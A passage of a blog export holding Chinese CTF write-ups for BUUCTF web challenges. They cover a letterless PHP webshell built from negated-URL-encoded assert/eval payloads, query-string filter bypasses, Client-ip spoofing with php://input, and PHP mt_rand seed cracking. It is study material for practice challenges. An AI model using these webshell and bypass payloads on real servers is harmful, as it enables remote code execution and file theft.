    <content type="text"><![CDATA[考点：无字母数字 getshell打开开门见山，直接给出源代码。 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die("This is too Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 看到这道题，我就想到p神。首先，这道题是出再php7环境下，php7和php5 有不一样的解法。 两个条件 传入值得长度不能大于40位 1if(strlen($code)&gt;40) 传入的值 不能存在 字母 数字 1preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)) php7前是不允许用($a)(); 这种方法来执行动态函数。php7支持了该方式。 123456$c = 'phpinfo';# 对 phpinfo 进行取反 再url编码输出echo urlencode(~$c);// %8F%97%8F%96%91%99%90 去请求 12GET：?code=(~%8F%97%8F%96%91%99%90)(); 能够成功执行。这里可以查看disable_functions禁用了哪些函数。 常用的 system exec shell_exec 都被禁用。 用 assert 来 执行 eval($_POST[cmd]) 123456$str1 = 'assert';echo urlencode(~$str1);$str2 = '(eval($_POST[cmd]))';echo '\n';echo urlencode(~$str2);// %9E%8C%8C%9A%8D%8B\n%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6 1234GET：?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);POST:cmd=phpinfo(); 回显 蚁剑连接 可以在根目录下看到flag 文件，但是不能打开，需要用到蚁剑的插件。 因为许多函数被禁用，终端不能执行命令，用这个插件可以在终端中成功执行命令。 总结]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>preg_match绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【MRCTF2020】套娃 1]]></title>
    <url>%2F2021%2F04%2F22%2F%5BMRCTF2020%5D%E5%A5%97%E5%A8%83%201%2F</url>
    <content type="text"><![CDATA[考点：代码审计和字符绕过打开一个平淡无奇的页面，查看源代码，得到一串代码 12345678910//1st# 拿到?后面的字符串$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo "you are going to the next ~";&#125; 经过分析，需要绕过两个条件 第一个 $query 中不能存在 _ %5f 1if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ) 第二个 $_GET[‘b_u_p_t’] 不能为 23333 用正常匹配 又必须为 23333 1if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])) 绕过方式 12?b.u.p.t=23333%0a?b%20u%20p%20t=23333%0a %20 . 用于绕过 _ ，%0a 绕过 正则首尾固定匹配。 回显 访问 源代码 1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]) 得到一串有规律的字符，放入控制台。 弹出 post me Merak 12POST:Merak=1 回显了源代码 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo 'Local access only!'."&lt;br/&gt;";$ip = getIp();if($ip!='127.0.0.1')echo "Sorry,you don't have permission! Your ip is :".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo "Your REQUEST is:".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt; 可以通过file_get_contents 来读取flag。 有两个条件 和 一个函数对输入内容进行处理 1if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ) 访问ip为 127.0.0.1 file_get_contents($_GET[‘2333’]) 读取的内容 为’todat is a happy day’ 绕过的方式都很简单 12构造header头Client-ip: 127.0.0.1 12345GET:?2333=php://inputPOST:todat is a happy day 接下来就是 反转对输入内容的处理 这个函数会将输入的字符进行base64解码，进行遍历，将每个字符转换成ascii码 + 当前位置2，在转换成字符。比如 ok，会将 o 转换成ascii码 111，再将 `111+12，就会得到113，再转换为字符q。kascii则是107，107+2*2=111，就会为o`。 12345678function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125; 写了一段反转的代码 123456789101112131415161718function change2($v)&#123; $re = ''; # 遍历字符串 for($i=0;$i&lt;strlen($v);$i++)&#123; # 将字符转换为ascii码值 + 当前字符下标的两倍// $re .= chr ( ord ($v[$i]) + $i*2 ); 0=&gt;0 1=&gt;2 2=&gt;4 $re .= chr(ord($v[$i]) - $i*2); &#125; $v = base64_encode($re); return $v;&#125;echo change2('flag.php');// 得到 ZmpdYSZmXGI= 最后 1234GET:?2333=php://input&amp;file=ZmpdYSZmXGI=POST:todat is a happy day 12构造header头Client-ip: 127.0.0.1 请求]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GWCTF 2019】枯燥的抽奖 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96%201%2F</url>
    <content type="text"><![CDATA[考点：PHP伪随机数的破解打开 以为是爆破后面10位密码，用bp提交了下，发现好像回显有代码，找到后发现被隐藏了，解开得到下面。 12345678910111213141516171819202122232425262728293031&lt;?php#这不是抽奖程序的源代码！不许看！header("Content-Type: text/html;charset=utf-8");session_start();if(!isset($_SESSION['seed']))&#123;$_SESSION['seed']=rand(0,999999999);&#125;mt_srand($_SESSION['seed']);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str='';$len1=20;# 生成20位字符串for ( $i = 0; $i &lt; $len1; $i++ )&#123; # 在 $str_long1 中 随机截取 0-61 中的一个 $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;# 显示生成的前10位$str_show = substr($str, 0, 10);echo "&lt;p id='p1'&gt;".$str_show."&lt;/p&gt;";if(isset($_POST['num']))&#123; if($_POST['num']===$str)&#123;x echo "&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"; &#125; else&#123; echo "&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"; &#125;&#125;show_source("check.php"); 这道题，在我去搜索mt_rand函数的用法的时候，搜索到一些信息。mt_rand是用来生成随机数的，但是如果mt_srand()函数的seep参数被固定后，mt_rand函数生成的随机数，就会有迹可循。 12$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); 这句代码的意思是 随机截取一个字符串，在$str_long1这个字符串当中，但是我们如果需要爆破的话，需要找到截取到的字符串对应的下位置，因为这个位置就是mt_rand生成的随机数。 根据对应的字符串 来生成对应的 数字 假设 这个字符串为VbjzN5cCrb 1234567891011121314str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VbjzN5cCrb'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res)// 就会转换成这样 // 57 57 0 61 1 1 0 61 9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61 再用php_mt_seed工具进行爆破 123456789┌──(kali㉿kali)-[~/Downloads/php_mt_seed-4.0]└─$ ./php_mt_seed 57 57 0 61 1 1 0 61 9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 443.2 Mseeds/s Version: 5.2.1+Found 0, trying 0xfe000000 - 0xffffffff, speed 21.3 Mseeds/s Found 0# 没跑出来 用php_mt_seed破解出来的seed值，再重新来生成完整的20位字符串。 12345678910111213&lt;?php# 用了个值代替mt_srand(67413330);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str = '';$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123; # 组成规则 # 从 $str_long1 字符串中 截取 $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str; 写了大致的解题过程，文本对不上，因为这个工具太不靠谱了，试了好几次，都解不出来。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>PHP伪随机数的破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华东南赛区】Web11 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11%201%2F</url>
